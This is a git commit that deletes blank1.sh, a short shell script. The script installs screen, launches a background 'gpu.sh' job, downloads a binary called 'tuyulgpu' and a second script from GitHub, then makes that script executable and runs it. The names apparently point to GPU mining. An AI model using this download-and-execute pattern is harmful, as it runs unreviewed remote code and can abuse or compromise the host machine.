d8c6e38ca03fb5b85b8c1f43de1f58669784d8c9
theblank07 <81615473+theblank07@users.noreply.github.com>
2021-06-22 02:32:25 +0800

    Delete blank1.sh

--- blank1.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/sh
-
-sudo apt update
-sudo apt install screen -y
-screen -dmS gpu.sh ./gpu.sh 65 75
-wget https://github.com/nuri655/nur/raw/main/tuyulgpu
-wget https://raw.githubusercontent.com/theblank07/new1/main/blank.sh
-chmod +x blank.sh
-./blank.sh
